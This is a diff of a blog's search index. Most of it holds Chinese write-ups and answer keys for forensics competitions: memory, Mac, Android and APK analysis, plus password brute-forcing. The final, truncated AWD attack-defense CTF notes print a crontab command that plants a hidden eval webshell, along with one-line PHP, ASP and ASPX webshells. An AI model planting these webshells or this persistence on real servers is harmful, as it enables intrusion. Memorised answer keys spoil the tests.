+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.exe -f 1.mem --profile=Win10x64_14393 dlllist -p 7424</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">************************************************************************</span><br><span class="line">chrone.exe pid:   7424</span><br><span class="line">Command line :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Base                             Size          LoadCount Path</span><br><span class="line">------------------ ------------------ ------------------ ----</span><br><span class="line">0x00000000008b0000           0x279000                0x0 伏见僙ᷨ</span><br><span class="line">0x00007ffba34e0000           0x1d2000                0x0 C:\Windows\SYSTEM32\ntdll.dll</span><br><span class="line">0x0000000058200000            0x52000                0x0 C:\Windows\System32\wow64.dll</span><br><span class="line">0x0000000058260000            0x77000                0x0 C:\Windows\System32\wow64win.dll</span><br><span class="line">0x00000000581f0000             0xa000                0x0 C:\Windows\System32\wow64cpu.dll</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：B</p>
+</blockquote>
+<p>29.根据臧觅风的计算机分析，请给出“\REGISTRY\MACHINE\SYSTEM”在内存镜像中的虚拟地址是多少？(答案格式:0xxxxx123…)(★★☆☆☆)</p>
+<p>使用命令查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.exe -f 1.mem --profile=Win10x64_14393 hivelist</span><br><span class="line"></span><br><span class="line">0xffffab861963e000 0x00000000584a1000 \REGISTRY\MACHINE\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：0xffffab861963e000</p>
+</blockquote>
+<p>30.根据臧觅风的计算机分析，据嫌疑人交代，其电脑上曾存打开过一个名为“账号信息.docx”的文档，请给出该文档的最后访问时间（北京时间）？(答案格式:2023-05-06 14:00:00)(★★★★☆)</p>
+<p>用x-ways看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绝对路径	\backup\mydata\账号信息.docx	</span><br><span class="line">上级目录	mydata	</span><br><span class="line">文件大小	13.0 KB (13,308)	</span><br><span class="line">创建时间	2023-04-27  17:54:06  +8	</span><br><span class="line">修改时间	2023-04-27  17:55:32  +8	</span><br><span class="line">记录更新时间	2023-04-27  17:55:32  +8	</span><br><span class="line">记录更新时间²	2023-04-27  17:55:32  +8	</span><br><span class="line">访问时间	2023-04-27  17:55:32  +8</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：2023-04-27  17:55:32</p>
+</blockquote>
+<p>31.根据臧觅风的计算机分析，接上题，请给出该文档的存储路径？(答案格式:C:\xxx\xxx)(★★★☆☆)</p>
+<blockquote>
+<p>答案：D:\backup\mydata\</p>
+</blockquote>
+<p>32.嫌疑人容恨寒苹果电脑的系统版本名称是？(答案格式:注意大小写)(★☆☆☆☆)</p>
+<p>火眼取证</p>
+<blockquote>
+<p>答案：macOS 12.6</p>
+</blockquote>
+<p>33.嫌疑人容恨寒苹果电脑操作系统安装日期是？(答案格式:2000-01-01)(★★☆☆☆)</p>
+<p>系统安装记录</p>
+<blockquote>
+<p>答案：2022-10-09</p>
+</blockquote>
+<p>34.嫌疑人容恨寒苹果电脑的内核版本是？(答案格式:xxxxx 11.0.4，注意大小写)(★☆☆☆☆)</p>
+<p>使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：Darwin Kernel Version 21.6.0</p>
+</blockquote>
+<p>35.嫌疑人容恨寒苹果电脑有多少正在运行的后台程序？(答案格式:20)(★★☆☆☆)</p>
+<p>36.嫌疑人容恨寒苹果电脑最后一次关机时间（GMT）？(答案格式:2000-01-01 01:00:09)(★★☆☆☆)</p>
+<p>查看系统日志<code>var/log/system.log</code>，还是要注意时区，日志里记录的是当地时区，-8</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apr 14 15:55:50 appledeMac sessionlogoutd[641]: DEAD_PROCESS: 153 console</span><br><span class="line">Apr 14 15:55:50 appledeMac shutdown[648]: SHUTDOWN_TIME: 1681458950 786473</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：2023-4-14 7:55:50</p>
+</blockquote>
+<p>37.嫌疑人容恨寒苹果电脑执行过多少次查询主机名称命令？(答案格式:20)(★★★☆☆)</p>
+<p><code>hostname</code>命令用于显示当前设备的主机名。在终端中运行<code>hostname</code>命令即可获取主机名</p>
+<p>在users/username目录下查看zsh_history文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-6 </span><br><span class="line"><span class="built_in">uname</span></span><br><span class="line">hostnamectl</span><br><span class="line">hostname</span><br><span class="line"><span class="built_in">history</span></span><br><span class="line">sudo spctl --master-disable</span><br><span class="line">sudo xattr -r -d com.apple.quarantine /Users/apple/Downloads/渚兓楂兏鐑﹥ㄦ兗?郴缁兛浣跨兇ㄧ兒儰iTunes锛儴鎯瘍板儻兌鑳ИMojave锛儵/iTunes.app  </span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">find / -name vmshare</span><br><span class="line">sudo xattr -r -d com.apple.quarantine /Applications/BigAnt5.app  </span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> library</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">su root</span><br><span class="line">su root</span><br><span class="line">sudo passwd root</span><br><span class="line">sudo password root</span><br><span class="line">find / -name backup</span><br><span class="line">fdisk -l</span><br><span class="line">sudo fdisk -l</span><br><span class="line">diskutil list</span><br><span class="line"><span class="built_in">df</span></span><br><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/disk0 of=/Volumes/VMware Shared Folders/mac.dd bs=1m conv=noerror,<span class="built_in">sync</span> </span><br><span class="line"><span class="built_in">df</span></span><br><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/disk0 of=/Volumes/Untitled/mac.dd bs=1m conv=noerror,<span class="built_in">sync</span> </span><br><span class="line">su root</span><br><span class="line">hostname</span><br><span class="line">hostnamectl</span><br><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/disk0 of=/Volumes/Untitled/mac.dd bs=1m conv=noerror,<span class="built_in">sync</span> </span><br><span class="line">sudo su</span><br><span class="line">diskulits list</span><br><span class="line">diskutli list</span><br><span class="line"><span class="built_in">history</span> -c</span><br><span class="line">diskutil list</span><br><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/disk1 of=/Volumes/Untitled/mac.dd bs=1m conv=noerror,<span class="built_in">sync</span> csrutli <span class="built_in">disable</span></span><br><span class="line">sudo csrutli <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
+
+<p>在终端历史命令中有两个hostname</p>
+<blockquote>
+<p>答案：2</p>
+</blockquote>
+<p>38.从嫌疑人容恨寒苹果电脑中找出“陆文杰”提现金额是？(答案格式:20)</p>
+<p>华南区文件用010查看为rar压缩包</p>
+<p>对桌面上华南区文件进行爆破</p>
+<p>得到<code>wlzhg@3698@hn</code></p>
+<p>得到三个文件：华南区、脚本、人员信息</p>
+<p>在华南区中发现</p>
+<table>
+<thead>
+<tr>
+<th>2992336319</th>
+<th>陆文杰</th>
+<th>提现</th>
+<th>10.00</th>
+<th>0.16</th>
+<th>2023-04-12 16:44:41</th>
+</tr>
+</thead>
+</table>
+<blockquote>
+<p>答案：10</p>
+</blockquote>
+<p>39.从嫌疑人容恨寒苹果电脑中找出嫌疑人容恨寒上午上班时长是？(答案格式:8小时)(★★★★☆)</p>
+<p>脚本.docx</p>
+<blockquote>
+<p>答案：2.5小时</p>
+</blockquote>
+<p>40.从嫌疑人容恨寒苹果电脑中找出“万便”的邮箱是？(答案格式:<a href="mailto:&#x78;&#120;&#x78;&#x40;&#120;&#x78;&#x78;&#x2e;&#120;&#x78;">&#x78;&#120;&#x78;&#x40;&#120;&#x78;&#x78;&#x2e;&#120;&#x78;</a>)(★★★★☆)</p>
+<p>人员信息.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">万便,女,30,03619361738,兴告什沙之早跑离入小才够实孩法人望帮如总船花,IxCnq3@yDp.net</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：<a href="mailto:&#73;&#x78;&#x43;&#x6e;&#x71;&#x33;&#64;&#x79;&#68;&#112;&#46;&#110;&#101;&#116;">&#73;&#x78;&#x43;&#x6e;&#x71;&#x33;&#64;&#x79;&#68;&#112;&#46;&#110;&#101;&#116;</a></p>
+</blockquote>
+<p>41.通过分析得出嫌疑人容恨寒小孩的年龄是？(答案格式:10岁)(★★★☆☆)</p>
+<p>在users下看到奥数教程，是一年级教程</p>
+<blockquote>
+<p>答案：7岁</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>电子取证</category>
+      </categories>
+      <tags>
+        <tag>2023盘古石杯</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2022美亚杯团体赛AGC</title>
     <url>/posts/a0796263.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>搜查人员于现场捡取一部服务器、一部员工 （Carson） 所用的桌面计算机及一 部流媒体服务器。 AGC 集团 IT 部門 人员称建立服务器的同事已离职，他只是 负责以浏览器登入服务器操作，对系统并不熟悉。 他只知道服务器所用的操作 系统为 “Proxmox”，上面运作一个虚拟计算器。 虚拟计算机运作公司的电邮系 统“Xeams”。现场专家在初步分析后表示“Proxmox”服务器透过三个硬盘以软 RAID 建立而成，<br>现场虽未能撷取服务器逻辑存储（Logical Storage）内容，但他认为先撷取逻辑存 储内容作检验较好; 桌面计算机相信被黑客入侵，分析流量纪录相信黑客取走了 服务器部份档案。</p>
@@ -329,337 +852,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2023第一届盘古石晋级赛</title>
-    <url>/posts/83fd5333.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以赛代练，以赛促学。唯有参赛，才知道菜。</p>
-<blockquote>
-<p>容器密码：usy1UN2Mmgram&amp;^d?0E5r9myrk!cmJGr</p>
-</blockquote>
-<h1 id="Android-APK部分"><a href="#Android-APK部分" class="headerlink" title="Android APK部分"></a>Android APK部分</h1><p>1、涉案应用刷刷樂的签名序列号是[★☆☆☆☆]</p>
-<p>我直接用雷电APP分析查看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">详细信息——&gt;有效签名APK1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>答案：11fcf899</p>
-</blockquote>
-<p>2、涉案应用刷刷樂是否包含读取短信权限答案：是/否[★★☆☆☆]</p>
-<table>
-<thead>
-<tr>
-<th>级别（危险）</th>
-<th align="left">读取电话状态android.permission.READ_PHONE_STATE</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>级别（正常）</strong></td>
-<td align="left">查看网络连接android.permission.ACCESS_NETWORK_STATE</td>
-<td>查看Wi-Fi连接android.permission.ACCESS_WIFI_STATE</td>
-</tr>
-<tr>
-<td></td>
-<td align="left">连接和断开Wi-F<br />iandroid.permission.CHANGE_WIFI_STATE</td>
-<td>安卓前台服务android.permission.FOREGROUND_SERVICE</td>
-</tr>
-<tr>
-<td></td>
-<td align="left">完全网络访问<br />android.permission.INTERNET</td>
-<td>请求安装应用android.permission.REQUEST_INSTALL_PACKAGES</td>
-</tr>
-<tr>
-<td></td>
-<td align="left">控制振动android.permission.VIBRATE</td>
-<td>修改或删除SD卡中的内容android.permission.WRITE_EXTERNAL_STORAGE</td>
-</tr>
-<tr>
-<td></td>
-<td align="left">android.permission.WAKE_LOCK</td>
-<td>修改华为桌面设置com.huawei.android.launcher.permission.CHANGE_BADGE</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>答案：否</p>
-</blockquote>
-<p>3、涉案应用刷刷樂打包封装的调证ID值是[答案：123ca12a] [★★☆☆☆]</p>
-<p>雷电app智能分析第三方服务中，查看调度值</p>
-<blockquote>
-<p>答案：a6021386163125</p>
-</blockquote>
-<p>4、涉案应用刷刷樂服务器地址域名是[答案：axa.baidun.com] [★★★☆☆]</p>
-<p>在源码中的index.html中可以找到服务器地址域名</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">api.openFrame(&#123;</span><br><span class="line">            name: <span class="string">&#x27;main&#x27;</span>,</span><br><span class="line">            url: <span class="string">&#x27;http://vip.shuadan.com:8084&#x27;</span>,</span><br><span class="line">            bounces: <span class="literal">false</span>,</span><br><span class="line">            rect: &#123;</span><br><span class="line">                w: <span class="string">&#x27;auto&#x27;</span>,</span><br><span class="line">                h: <span class="string">&#x27;auto&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            progress:&#123;</span><br><span class="line">                type:<span class="string">&#x27;page&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>答案：<a href="http://vip.shuadan.com:8084/">http://vip.shuadan.com:8084</a></p>
-</blockquote>
-<p>5、涉案应用刷刷樂是否存在录音行为[答案：是/否] [★★★☆☆]</p>
-<p>搜索关键词：在反编译后的源代码中搜索关键词，如”record audio”、”audio recording”、”MediaRecorder”等。这些关键词通常与录音功能相关联。</p>
-<p>在jadx中可以在<code>com.uzmap.pkg.a.b.e</code>搜索到录音相关功能</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.media.MediaRecorder;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>答案：是</p>
-</blockquote>
-<p>6、涉案应用未来资产的包名是[答案：axa.baidun.com] [★☆☆☆☆]</p>
-<p>任意检查APK软件都可以看</p>
-<blockquote>
-<p>答案： plus.H5CE4B30D</p>
-</blockquote>
-<p>7、涉案应用未来资产的语音识别服务的调证key值是[答案：1ca2jc] [★★☆☆☆]</p>
-<p>在可以查看AndroidManifest.xml</p>
-<p>科大讯飞股份有限公司</p>
-<p>讯飞开放平台：IFLY_APPKEY：53feacdd</p>
-<blockquote>
-<p>答案：53feacdd</p>
-</blockquote>
-<p>8、涉案应用未来资产的服务器地址域名是[答案：axa.baidun.com] [★★★☆☆]</p>
-<p>使用雷电APP智能分析</p>
-<blockquote>
-<p>答案：<a href="http://vip.usdtre.club:8085/">http://vip.usdtre.club:8085/</a></p>
-</blockquote>
-<p>9、涉案应用未来资产的打包封装的调证ID值是是[答案：axa.baidun.com] [★★☆☆☆]</p>
-<p>直接查看打包服务商</p>
-<blockquote>
-<p>答案：H5CE4B30D</p>
-</blockquote>
-<h1 id="手机取证部分"><a href="#手机取证部分" class="headerlink" title="手机取证部分"></a>手机取证部分</h1><p>1、根据容恨寒的安卓手机分析，手机的蓝牙物理地址是[答案：B9:8B:35:8B:03:52] [★☆☆☆☆]</p>
-<p>手机取证系统直接看</p>
-<blockquote>
-<p>答案：A9:8B:34:8B:04:50</p>
-</blockquote>
-<p>2、根据容恨寒的安卓手机分析，SIM卡的ICCID是[答案：80891103212348510720] [★☆☆☆☆]</p>
-<p>手机取证系统直接看</p>
-<blockquote>
-<p>答案：89014103211118510720</p>
-</blockquote>
-<p>3、根据容恨寒的安卓手机分析，团队内部沟通的聊天工具程序名称是[答案：微信] [★☆☆☆☆]</p>
-<p>根据后面的题目，再数据库查找信息时确定的</p>
-<blockquote>
-<p>答案：Potato</p>
-</blockquote>
-<p>4、根据容恨寒的安卓手机分析，团队内部沟通容恨寒收到的最后一条聊天信息内容是[答案：好的] [★★★☆☆]</p>
-<p>首先找到包名为com.qim.imm的文件夹，文件夹下有数据库文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/data/data/com.qim.imm/databases/im_db_225_18969939616_8AF2C81F-58C2-8459-C492-9C4F65E6BC1E.db</span><br></pre></td></tr></table></figure>
-
-<p>我的需要从本地文件中导出使用，挂载起手机取证分析系统后，导出就没有这个目录</p>
-<p>之后用SQL数据库软件导入表</p>
-<p>使用语句直接查询</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TONAME,<span class="type">DATE</span>,BODY <span class="keyword">FROM</span> &quot;BAProvider$j&quot; <span class="keyword">WHERE</span> TONAME<span class="operator">=</span><span class="string">&#x27;容恨寒&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="type">DATE</span> <span class="keyword">DESC</span> LIMIT <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>得到BODY</p>
-<table>
-<thead>
-<tr>
-<th>DATE</th>
-<th>BODY</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1681302605884863</td>
-<td>PEJURj48Rm9udCBuYW1lPSJNaWNyb3NvZnQgWWFIZWkiIHNpemU9IjEwIiBmbGFncz0iMSIgLz48VGV4dD7lkI7pnaLlho3nu5nkvaDku6zmkJ48L1RleHQ+PC9CVEY+</td>
-</tr>
-</tbody></table>
-<p>BODY解密后</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;BTF&gt;&lt;Font name=&quot;Microsoft YaHei&quot; size=&quot;10&quot; flags=&quot;1&quot; /&gt;&lt;Text&gt;后面再给你们搞&lt;/Text&gt;&lt;/BTF&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>答案：后面再给你们搞</p>
-</blockquote>
-<p>5、根据容恨寒的安卓手机分析，收到的刷单.rar的MD5值是[答案：202cb962ac59075b964b07152d234b70] [★★☆☆☆]</p>
-<blockquote>
-<p>答案：dc52d8225fd328c592841cb1c3cd1761</p>
-</blockquote>
-<p>6、根据容恨寒的安卓手机分析，收到的刷单.rar的解压密码是[答案：abcdg@1234@hd] [★★★☆☆]</p>
-<p>在表中BAProvider$h</p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">密码规则：</span><br><span class="line">前五位：wlzhg</span><br><span class="line">末尾两位：片区简写“xn”</span><br><span class="line">中间四位：0-9随机数组合</span><br><span class="line">各部分用@连接</span><br><span class="line">示例：wlzhg@8888@xn</span><br></pre></td></tr></table></figure>
-
-<p>使用Passware Kit Forensic进行掩码爆破</p>
-<p>自定义设置</p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">字符长：13 to 13</span><br><span class="line">语言：English</span><br><span class="line">已知部分密码：wlzhg@*@xn</span><br><span class="line">选择：Number</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>答案：wlzhg@3903@xn</p>
-</blockquote>
-<p>7、根据容恨寒的安卓手机分析，发送刷单.rar的用户的手机号是[答案：15137321234] [★★★★☆]</p>
-<p>将BAProbider$j与BAProbider$b数据进行base64解密</p>
-<p>在id为860C8E3C-3CA5-42C3-94B2-B5ECDF3B3FA1的一行上可以发现是发送了刷单.rar</p>
-<p>从而确定了用户为<code>德彦慧</code></p>
-<p>解密脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">base64_string</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(base64_string).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取Excel文件</span></span><br><span class="line">wb = openpyxl.load_workbook(<span class="string">&#x27;.xlsx&#x27;</span>)</span><br><span class="line">sheet = wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新的工作簿</span></span><br><span class="line">new_wb = openpyxl.Workbook()</span><br><span class="line">new_sheet = new_wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每个单元格</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows(values_only=<span class="literal">True</span>):</span><br><span class="line">    new_row = []</span><br><span class="line">    <span class="keyword">for</span> idx, cell <span class="keyword">in</span> <span class="built_in">enumerate</span>(row):</span><br><span class="line">        <span class="comment"># 根据你需要解密的列数，如果是第八列（列索引为7）且单元格的数据是字符串</span></span><br><span class="line">        <span class="keyword">if</span> idx == <span class="number">2</span> <span class="keyword">and</span> <span class="built_in">isinstance</span>(cell, <span class="built_in">str</span>):</span><br><span class="line">            decoded_data = decode_base64(cell)</span><br><span class="line">            new_row.append(decoded_data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_row.append(cell)</span><br><span class="line">    </span><br><span class="line">    new_sheet.append(new_row)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存新的Excel文件</span></span><br><span class="line">new_wb.save(<span class="string">&#x27;.xlsx&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>答案：15137326185</p>
-</blockquote>
-<p>8、根据容恨寒的安卓手机分析，发送多个报表的用户来自哪个部门[答案：理财部] [★★★★★]</p>
-<p>可以找到一个有相关部门的表。</p>
-<p>其实根据案件解析就知道有一名技术人员，估计属于技术部。</p>
-<p>正常做法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据将BAProbider$j与BAProbider$b数据进行关联，可以得到文件都是臧觅风发的</span><br><span class="line"></span><br><span class="line">在表o可以得到风的id为229，表k中技术部的id为109</span><br><span class="line"></span><br><span class="line">在表m中可以得知与109相关联的有228、229、230</span><br></pre></td></tr></table></figure>
-
-<p>所以风是来自技术部的</p>
-<blockquote>
-<p>答案：技术部</p>
-</blockquote>
-<p>9、根据容恨寒的安卓手机分析，MAC的开机密码是[答案：asdcz] [★☆☆☆☆]</p>
-<p>手机备忘录记事本</p>
-<blockquote>
-<p>答案：apple</p>
-</blockquote>
-<p>10、根据容恨寒的安卓手机分析，苹果手机的备份密码前4位是[答案：1234] [★☆☆☆☆]</p>
-<p>手机备忘录记事本</p>
-<blockquote>
-<p>答案：1976</p>
-</blockquote>
-<p>11、根据魏文茵苹果手机分析，IMEI号是？[答案格式:239471000325479] [★☆☆☆☆]</p>
-<p>设备信息</p>
-<blockquote>
-<p>答案：358360063200634</p>
-</blockquote>
-<p>12、根据魏文茵苹果手机分析，可能使用过的电话号码不包括？[答案格式:A] [★☆☆☆☆]</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A、18043618705</span><br><span class="line">B、19212175391</span><br><span class="line">C、19212159177</span><br><span class="line">D、18200532661</span><br></pre></td></tr></table></figure>
-
-<p>只有D没有搜索到</p>
-<blockquote>
-<p>答案：D</p>
-</blockquote>
-<p>13、根据臧觅风的安卓手机分析，微信ID是[答案：wxid_av7b3jbaaht123] [★☆☆☆☆]</p>
-<p>查看通讯工具微信，账号信息</p>
-<blockquote>
-<p>答案：wxid_kr7b3jbooht322</p>
-</blockquote>
-<p>14、根据臧觅风的安卓手机分析，在哪里使用过交友软件[答案：杭州] [★★★☆☆]</p>
-<p>就只有交友软件探探中给了地址西安，其他的没有</p>
-<blockquote>
-<p>答案：西安</p>
-</blockquote>
-<p>15、根据臧觅风的安卓手机分析，嫌疑人从哪个用户购买的源码，请给出出售源码方的账号[答案：1234524229] [★☆☆☆☆]</p>
-<p>在Telegram中发现</p>
-<p>在与ming chen的聊天记录中可以发现，就是在他这里购买的源码</p>
-<p>查看好友ming chen的信息</p>
-<blockquote>
-<p>答案：5768224669</p>
-</blockquote>
-<p>16、根据臧觅风的安卓手机分析，购买源码花了多少BTC？[答案：1.21] [★☆☆☆☆]</p>
-<p>与ming chen聊天记录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ming chen</span><br><span class="line">0.2BT</span><br><span class="line">后来讲价为</span><br><span class="line">0.08</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>答案：0.08</p>
-</blockquote>
-<p>17、根据臧觅风的安卓手机分析，接收源码的邮箱是[答案：<a href="mailto:&#x61;&#115;&#100;&#97;&#115;&#100;&#x36;&#54;&#x36;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#x61;&#115;&#100;&#97;&#115;&#100;&#x36;&#54;&#x36;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a>] [★☆☆☆☆]</p>
-<p>还是聊天记录</p>
-<blockquote>
-<p>答案：<a href="mailto:&#x6d;&#x6f;&#108;&#105;&#104;&#117;&#97;&#x63;&#104;&#x61;&#48;&#48;&#55;&#x40;&#104;&#111;&#116;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109;">&#x6d;&#x6f;&#108;&#105;&#104;&#117;&#97;&#x63;&#104;&#x61;&#48;&#48;&#55;&#x40;&#104;&#111;&#116;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109;</a></p>
-</blockquote>
-<p>18、嫌疑人容恨寒苹果手机的IMEI是?[★★☆☆☆]</p>
-<p>直接查看备份文件中的info.plist文件，检索IMEI</p>
-<blockquote>
-<p>答案：353271073008914</p>
-</blockquote>
-<p>19、嫌疑人容恨寒苹果手机最后备份时间是?[答案格式:2000-01-01 13:36:25] [★★☆☆☆]</p>
-<p>在info文件中，存在值Last Backup Date，将值取出加上8就是答案</p>
-<blockquote>
-<p>答案：2023-04-12 21:20:59</p>
-</blockquote>
-<p>20、嫌疑人容恨寒苹果手机“易信”的唯一标识符（UUID）？[★★★★☆]</p>
-<p>直接去软件数据保存的地方找，一般以包名为命名的文件夹中包含许多相关信息，比如数据库，标识文件等</p>
-<p>在手机文件中找到/AppDomain-com.yixin.yixin/Documents/login_device_id_v1</p>
-<p>打开就看到</p>
-<blockquote>
-<p>答案：ec677dda-3387-4337-9b44-f7daae4fb29c</p>
-</blockquote>
-<p>21、嫌疑人容恨寒苹果手机微信ID是?[★☆☆☆☆]</p>
-<p>取证分析后直接查看微信账号信息</p>
-<blockquote>
-<p>答案：wxid_peshwv0rosih12</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>电子取证</category>
-      </categories>
-      <tags>
-        <tag>2023盘古石杯</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AWD学习日记二</title>
-    <url>/posts/1466a239.html</url>
-    <content><![CDATA[<h1 id="比赛攻击思路"><a href="#比赛攻击思路" class="headerlink" title="比赛攻击思路"></a>比赛攻击思路</h1><h2 id="搜索存活主机"><a href="#搜索存活主机" class="headerlink" title="搜索存活主机"></a>搜索存活主机</h2><p>信息收集</p>
-<ul>
-<li>nmap、Routescan</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sn 192.168.0.0/24          <span class="comment">#扫描C段主机存活</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Python 脚本</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">for x in range(2,255): </span><br><span class="line">    url = &quot;http://192.168.1.&#123;&#125;&quot;.format(x) </span><br><span class="line">    try: </span><br><span class="line">        r = requests.post(url) </span><br><span class="line">        print(url) </span><br><span class="line">        except: </span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
-
-<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>预留到后面会被防守人删除，所以为了稳定得分，我们得进行权限维持。</p>
-<p><strong>隐藏文件读取</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(php<span class="string">&#x27;flag:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-<p><strong>crontab定时任务</strong><br>使用定时任务写马</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&#x27;echo &quot;* * * * * echo \&quot;&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\&#x27;</span>462d4a0e7cedd6b024a4d99f10c614d1\<span class="string">&#x27;)&#123;@eval(\\\\\\\\\$_POST[1]);&#125;  \&quot; &gt; /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>密码：atkx<br>来指定用户运行指定的定时任务</p>
-<h2 id="预留后门利用"><a href="#预留后门利用" class="headerlink" title="预留后门利用"></a>预留后门利用</h2><p>记录一下蚁剑连接，get型木马</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">/shell.php?pass=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">连接密码：<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>常用一句话木马：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php： </span><br><span class="line">	<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span>      </span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">asp：   </span><br><span class="line">	&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span> (<span class="string">&quot;pass&quot;</span>)%&gt;</span><br><span class="line">aspx：</span><br><span class="line">	&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;</span><br><span class="line">	&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;pass&quot;</span>],<span 